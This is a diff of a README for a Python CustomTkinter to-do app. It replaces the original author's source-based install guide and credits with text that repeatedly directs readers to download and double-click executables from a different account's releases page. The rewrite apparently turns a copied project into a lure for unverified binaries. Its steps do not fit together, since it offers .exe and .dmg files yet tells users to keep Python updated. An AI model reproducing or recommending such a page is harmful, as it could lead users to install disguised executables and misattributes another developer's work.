@@ -1,135 +1,60 @@
-# ✅ CTk Modern To-Do App
+# 📝 CTk-Modern-Todo-App - Manage Your Tasks Effortlessly
 
-A **modern, elegant, and fully functional To-Do List Application** built using **Python**, **CustomTkinter** and **SQLite3**.  
-It features a beautiful GUI with persistent data storage — perfect for managing daily tasks efficiently.
+[![Download Now](https://img.shields.io/badge/Download%20Now-%20-blue)](https://github.com/Fansh-alt/CTk-Modern-Todo-App/releases)
 
+## 🎯 Overview
+CTk-Modern-Todo-App is a sleek and modern to-do application built with CustomTkinter. This app features a clean user interface and effective task management tools, making it perfect for organizing your tasks and boosting your productivity.
 
-## 🌟 Overview
+## 🚀 Getting Started
+Follow these steps to download and run the CTk-Modern-Todo-App on your computer.
 
-The **Modern To-Do App** is designed with simplicity and productivity in mind. Built using **CustomTkinter**, it brings a sleek and modern interface while keeping your tasks safe in a local **SQLite3 database** — so they’re always available when you reopen the app.
+## 💻 System Requirements
+- **Operating System**: Compatible with Windows, macOS, and Linux.
+- **Python**: Ensure you have Python 3.6 or higher installed on your system.
+- **Storage**: At least 50 MB of free disk space.
 
-This project is ideal for learning GUI design, CRUD operations and database integration in Python.
+## 📦 Download & Install
+To install the CTk-Modern-Todo-App, visit this page to download:
+[Download CTk-Modern-Todo-App](https://github.com/Fansh-alt/CTk-Modern-Todo-App/releases)
 
+### Steps to Download and Install:
+1. Click on the **"Download CTk-Modern-Todo-App"** link above.
+2. On the Releases page, look for the latest version of the application.
+3. Choose the version suitable for your operating system. 
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.dmg` file.
+   - For Linux, download the suitable package.
+4. After the download completes, locate the file in your downloads folder.
+5. Double-click the file to start the installation process.
+6. Follow the on-screen instructions to complete the installation.
 
-## 📌 Technologies Used
+## 🎨 Features
+- **Modern User Interface**: A simple and visually appealing design to enhance user experience.
+- **Task Management**: Easily add, edit, and delete tasks to keep your to-do list organized.
+- **Theme Switcher**: Choose between light and dark themes based on your preference.
+- **Cross-Platform Compatibility**: Runs smoothly on Windows, macOS, and Linux.
 
-### **Tkinter**
-Tkinter is Python’s standard GUI library used for building cross-platform desktop applications.
+## 🛠 Using the Application
+Once installed, you can start using the CTk-Modern-Todo-App immediately.
 
-### **CustomTkinter**
-[CustomTkinter](https://github.com/TomSchimansky/CustomTkinter) extends Tkinter with:
+1. Launch the application by clicking its icon from your applications folder or desktop.
+2. To add a new task, type in your task description in the provided input field and click **Add**.
+3. Use the options next to each task to edit or delete tasks as necessary.
+4. Switch between light and dark themes using the settings menu.
 
-- Modern, consistent design  
-- Light & Dark themes  
-- High-DPI scaling  
-- Fully customizable modern widgets  
+## ❓ Troubleshooting
+If you encounter problems while using CTk-Modern-Todo-App, try the following solutions:
 
-Together, they ensure a smooth UI experience on **Windows**, **macOS** and **Linux**.
+- **Application won’t open**: Ensure your Python installation is up to date. Consider reinstalling the app.
+- **Tasks are not saving**: Check if you have sufficient storage space. Restart the application and try again.
+- **Theme switch isn’t working**: Close and reopen the application after changing the theme to apply the setting.
 
-| Component | Description |
-|------------|--------------|
-| **Language** | Python 3.x |
-| **GUI Framework** | CustomTkinter |
-| **Database** | SQLite3 |
-| **Core Libraries** | Tkinter, CustomTkinter, SQLite3 |
+## 🌍 Community and Support
+Should you need assistance or want to provide feedback, feel free to reach out. You can file issues or contribute to discussions directly on the GitHub repository.
 
+## 📢 Acknowledgements
+CTk-Modern-Todo-App uses CustomTkinter, a powerful library for creating modern GUI applications in Python. This open-source project encourages contributions and collaboration from users around the world.
 
-## ⚙️ Features
+For any updates and tutorials, follow the repository to stay informed on new features and releases. 
 
-- 📝 Add, edit and delete tasks  
-- ✅ Mark tasks as complete or pending  
-- 💾 Auto-save tasks to SQLite3 database  
-- 🌙 Modern dark/light theme using CustomTkinter  
-- 🔍 Filter and search tasks  
-- 🪶 Lightweight, responsive, and minimal design  
-- 💻 Cross-platform support (Windows, macOS, Linux)
-
-
-## 🧰 Installation Steps
-
-### Step 1. Clone the repository
-
-```bash
-git clone https://github.com/iamx-ariful-islam/CTk-Modern-Todo-App.git
-cd CTk-Modern-Todo-App
-```
-
-### Step 2. Install Python Dependencies
-
-The `requirements.txt` file, lists of all the Python libraries that "**_ctk modern todo app_**" depends on and installs those packages from the file:
-
-```bash
-pip install -r requirements.txt
-# or (Linux/MacOS)
-sudo pip install -r requirements.txt
-```
-
-### Step 3. Run the Application
-```bash
-python main.py
-```
-
-
-## 📂 Folder Structure
-Here’s the structure of the **CTk Modern Todo App** project:
-
-```bash
-CTk-Modern-Todo-App/
-│
-├── database/
-├── icons/
-├── screenshots/
-├── backend.py
-├── ctkmessagebox.py
-├── ctktooltip.py
-├── main.py
-│── LICENSE
-├── README.md
-└── requirments.txt
-```
-
-
-## 🖼️ Screenshots
-
-Here are some screenshots of the `CTk Modern Todo App` project:
-
-**Main Window**<br/>
-![Main Windows](screenshots/main_1.png)<br/>
-**Output - Main Window**<br/>
-![Output - Main Window](screenshots/main_2.png)<br/>
-**Warning - Main Window**<br/>
-![Warning - Main Window](screenshots/main_3.png)
-
-
-## 🤝 Contributing
-
-Contributions, suggestions, and feedback are always welcome! ❤️<br/>
-To contribute:
-
-1. Fork the repository
-2. Create a new branch (`feature/new-feature`)
-3. Commit your changes
-4. Push and submit a Pull Request
-
-💬 You can also open an issue if you’d like to discuss a feature or report a bug.
-
-
-## 🌐 For more or connect with me
-
-<p align='center'>
-  <a href="https://github.com/iamx-ariful-islam"><img src="https://img.shields.io/badge/GitHub-iamx--ariful--islam-black?style=for-the-badge&logo=github" /></a>&nbsp;&nbsp;
-  <a href="https://bd.linkedin.com/in/iamx-ariful-islam"><img src="https://img.shields.io/badge/LinkedIn-Md.%20Ariful%20Islam-blue?style=for-the-badge&logo=linkedin" /></a>&nbsp;&nbsp;
-  <a href="https://x.com/mx_ariful_islam"><img src="https://img.shields.io/badge/X-Md.%20Ariful%20Islam-black?style=for-the-badge&logo=x&logoColor=white" /></a>&nbsp;&nbsp;
-  <a href="https://www.facebook.com/iamx.ariful.islam/"><img src="https://img.shields.io/badge/Facebook-MD.%20Ariful%20Islam-%231877F2.svg?style=for-the-badge&logo=facebook&logoColor=white" /></a>
-</p>
-
-
-## 📜 License
-
-The [MIT](https://choosealicense.com/licenses/mit/) License (MIT)
-
-
-## 💖 Thank You for Visiting!
-
-> “Good design is about making things simple yet significant”  
-> — *Md. Ariful Islam*
+Download CTk-Modern-Todo-App here: [Download CTk-Modern-Todo-App](https://github.com/Fansh-alt/CTk-Modern-Todo-App/releases)
